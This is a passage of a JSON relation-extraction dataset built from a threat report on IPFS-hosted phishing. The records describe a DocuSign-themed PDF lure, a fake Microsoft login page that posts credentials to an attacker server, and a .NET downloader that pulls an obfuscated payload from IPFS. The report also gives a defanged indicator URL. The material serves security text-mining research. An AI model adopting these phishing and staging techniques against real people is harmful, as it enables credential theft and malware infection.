"10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [181, 181], "name": "attacker", "pos": [7, 8], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [184, 184], "name": "HTTP POST", "pos": [10, 12], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [190, 190], "name": "web server", "pos": [16, 18], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [210, 210], "name": "PDF hyperlink", "pos": [5, 7], "index": "14_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 2}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 2}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 7}, {"r": "ST", "evidence": [3], "h": 4, "t": 5}, {"r": "RF", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5], "h": 7, "t": 9}, {"r": "CO", "evidence": [5], "h": 8, "t": 9}, {"r": "CO", "evidence": [5, 6], "h": 8, "t": 10}, {"r": "RD", "evidence": [6], "t": 10, "h": 11}, {"r": "WR", "evidence": [6], "t": 10, "h": 12}, {"r": "RF", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "RF", "evidence": [6, 7], "h": 12, "t": 14}]}, {"title": "608-5", "sents": [["The", "IPFS", "identifier", ",", "or", "CID", ",", "for", "the", "resource", "is", "highlighted", "below.hxxps", ":", "bafybeiaysi4s6lnjev27ln5icwm6tue", "other", "implementations", ",", "the", "IPFS", "resource", "location", "is", "appended", "to", "the", "end", "of", "the", "URL", "being", "requested", ",", "as", "shown", "in", "the", "following", "example", ":", "hxxps", ":", "//ipfs.io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tue", "are", "other", "methods", "for", "handling", "requests", "using", "DNS", "entries", ",", "as", "well", "."], ["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [29, 29], "name": "URL", "pos": [29, 30], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [61, 61], "name": "victim", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "PDF", "pos": [8, 9], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [78, 78], "name": "victim", "pos": [2, 3], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [86, 86], "name": "link", "pos": [10, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [116, 116], "name": "IPFS network", "pos": [10, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [120, 120], "name": "user", "pos": [1, 2], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [126, 126], "name": "email address", "pos": [7, 9], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [129, 129], "name": "password", "pos": [10, 11], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [132, 132], "name": "information", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "attacker", "pos": [7, 8], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [141, 141], "name": "HTTP POST", "pos": [10, 12], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [147, 147], "name": "web server", "pos": [16, 18], "index": "12_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [167, 167], "name": "PDF hyperlink", "pos": [5, 7], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 6, "t": 8}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "RD", "evidence": [5], "t": 9, "h": 10}, {"r": "WR", "evidence": [5], "t": 9, "h": 11}, {"r": "RF", "evidence": [5], "h": 11, "t": 12}, {"r": "ST", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "RF", "evidence": [5, 6], "h": 11, "t": 13}]}, {"title": "608-6", "sents": [["In", "one", "example", ",", "the", "victim", "received", "a", "PDF", "that", "purports", "to", "be", "associated", "with", "the", "DocuSign", "document-signing", "service", "."], ["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "victim", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "PDF", "pos": [8, 9], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [22, 22], "name": "victim", "pos": [2, 3], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "link", "pos": [10, 11], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [60, 60], "name": "IPFS network", "pos": [10, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [64, 64], "name": "user", "pos": [1, 2], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [70, 70], "name": "email address", "pos": [7, 9], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [73, 73], "name": "password", "pos": [10, 11], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [76, 76], "name": "information", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "attacker", "pos": [7, 8], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [85, 85], "name": "HTTP POST", "pos": [10, 12], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [91, 91], "name": "web server", "pos": [16, 18], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [111, 111], "name": "PDF hyperlink", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "PE32 executable", "pos": [9, 11], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 5}, {"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "RD", "evidence": [4], "t": 8, "h": 9}, {"r": "WR", "evidence": [4], "t": 8, "h": 10}, {"r": "RF", "evidence": [4], "h": 10, "t": 11}, {"r": "ST", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "RF", "evidence": [4, 5], "h": 10, "t": 12}]}, {"title": "608-7", "sents": [["When", "the", "victim", "clicks", "on", "the", "``", "Review", "Document", "''", "link", ",", "they", "are", "redirected", "to", "a", "page", "made", "to", "appear", "as", "if", "it", "is", "a", "Microsoft", "authentication", "page", "."], ["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "victim", "pos": [2, 3], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [10, 10], "name": "link", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "IPFS network", "pos": [10, 12], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [44, 44], "name": "user", "pos": [1, 2], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [50, 50], "name": "email address", "pos": [7, 9], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [53, 53], "name": "password", "pos": [10, 11], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [56, 56], "name": "information", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "attacker", "pos": [7, 8], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [65, 65], "name": "HTTP POST", "pos": [10, 12], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "web server", "pos": [16, 18], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [91, 91], "name": "PDF hyperlink", "pos": [5, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [158, 158], "name": "PE32 executable", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [162, 162], "name": "executable", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [167, 167], "name": ".NET", "pos": [6, 7], "index": "13_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RD", "evidence": [3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "t": 6, "h": 8}, {"r": "RF", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "RF", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 12}]}, {"title": "608-8", "sents": [["However", ",", "the", "page", "is", "actually", "being", "hosted", "on", "the", "IPFS", "network", "."], ["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [10, 10], "name": "IPFS network", "pos": [10, 12], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [14, 14], "name": "user", "pos": [1, 2], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [20, 20], "name": "email address", "pos": [7, 9], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [23, 23], "name": "password", "pos": [10, 11], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [26, 26], "name": "information", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "attacker", "pos": [7, 8], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [35, 35], "name": "HTTP POST", "pos": [10, 12], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [41, 41], "name": "web server", "pos": [16, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [61, 61], "name": "PDF hyperlink", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [128, 128], "name": "PE32 executable", "pos": [9, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [132, 132], "name": "executable", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [137, 137], "name": ".NET", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "downloader", "pos": [4, 5], "index": "12_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [161, 161], "name": "IPFS gateway", "pos": [9, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "data", "pos": [16, 17], "index": "14_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RD", "evidence": [2], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "t": 4, "h": 6}, {"r": "RF", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "RF", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "t": 8, "h": 12}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "t": 8, "h": 12}, {"r": "EX", "evidence": [6, 7], "t": 11, "h": 12}, {"r": "ST", "evidence": [7], "h": 12, "t": 13}, {"r": "RF", "evidence": [7], "h": 12, "t": 13}, {"r": "WR", "evidence": [7], "h": 12, "t": 14}]}, {"title": "608-9", "sents": [["The", "user", "is", "prompted", "to", "enter", "an", "email", "address", "and", "password", "."], ["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [1, 1], "name": "user", "pos": [1, 2], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "email address", "pos": [7, 9], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [10, 10], "name": "password", "pos": [10, 11], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [13, 13], "name": "information", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "attacker", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [22, 22], "name": "HTTP POST", "pos": [10, 12], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [28, 28], "name": "web server", "pos": [16, 18], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [48, 48], "name": "PDF hyperlink", "pos": [5, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [115, 115], "name": "PE32 executable", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "executable", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [124, 124], "name": ".NET", "pos": [6, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [143, 143], "name": "downloader", "pos": [4, 5], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [148, 148], "name": "IPFS gateway", "pos": [9, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [155, 155], "name": "data", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [169, 169], "name": "data", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [173, 173], "name": "PE32 executable", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [180, 180], "name": "malware payload", "pos": [12, 14], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 5}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "t": 7, "h": 11}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "t": 7, "h": 11}, {"r": "EX", "evidence": [5, 6], "t": 10, "h": 11}, {"r": "ST", "evidence": [6], "h": 11, "t": 12}, {"r": "RF", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 16}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "CO", "evidence": [6, 7], "h": 13, "t": 14}]}, {"title": "608-10", "sents": [["This", "information", "is", "then", "transmitted", "to", "the", "attacker", "via", "an", "HTTP", "POST", "request", "to", "an", "attacker-controlled", "web", "server", "where", "it", "can", "be", "collected", "and", "processed", "for", "use", "in", "further", "attacks", "."], ["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [1, 1], "name": "information", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "attacker", "pos": [7, 8], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [10, 10], "name": "HTTP POST", "pos": [10, 12], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [16, 16], "name": "web server", "pos": [16, 18], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "PDF hyperlink", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "PE32 executable", "pos": [9, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "executable", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [112, 112], "name": ".NET", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [131, 131], "name": "downloader", "pos": [4, 5], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [136, 136], "name": "IPFS gateway", "pos": [9, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "data", "pos": [16, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [157, 157], "name": "data", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [161, 161], "name": "PE32 executable", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "malware payload", "pos": [12, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "downloader", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "data", "pos": [4, 5], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [178, 178], "name": "IPFS gateway", "pos": [7, 9], "index": "16_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "RF", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "t": 4, "h": 8}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "t": 4, "h": 8}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "ST", "evidence": [5], "h": 8, "t": 9}, {"r": "RF", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "h": 8, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 15}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}, {"r": "ST", "evidence": [7], "h": 14, "t": 16}, {"r": "RF", "evidence": [7], "h": 14, "t": 16}]}, {"title": "608-11", "sents": [["In", "this", "case", ",", "the", "PDF", "hyperlink", "was", "pointing", "to", "an", "IPFS", "gateway", "that", "moderated", "the", "content", "to", "protect", "potential", "victims", "and", "displayed", "the", "following", "message", "to", "victims", "attempting", "to", "navigate", "to", "it", "."], ["However", ",", "the", "content", "is", "still", "present", "within", "the", "IPFS", "network", "and", "simply", "changing", "the", "IPFS", "gateway", "being", "used", "to", "retrieve", "the", "content", "confirms", "this", "is", "the", "case", "."], ["The", "email", "contains", "a", "ZIP", "attachment", "that", "holds", "a", "PE32", "executable", "."], ["The", "executable", ",", "written", "in", "a", ".NET", ",", "functions", "as", "a", "downloader", "for", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["When", "executed", ",", "the", "downloader", "reaches", "out", "to", "an", "IPFS", "gateway", "to", "retrieve", "a", "blob", "of", "data", "that", "has", "been", "hosted", "within", "the", "IPFS", "network", "as", "shown", "below", "."], ["This", "data", "contains", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "malware", "payload", "."], ["The", "downloader", "takes", "the", "data", "from", "the", "IPFS", "gateway", "and", "stores", "each", "byte", "in", "an", "array", "."], ["It", "then", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "PDF hyperlink", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "PE32 executable", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "executable", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": ".NET", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "downloader", "pos": [4, 5], "index": "4_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [105, 105], "name": "IPFS gateway", "pos": [9, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [112, 112], "name": "data", "pos": [16, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [126, 126], "name": "data", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [130, 130], "name": "PE32 executable", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "malware payload", "pos": [12, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [141, 141], "name": "downloader", "pos": [1, 2], "index": 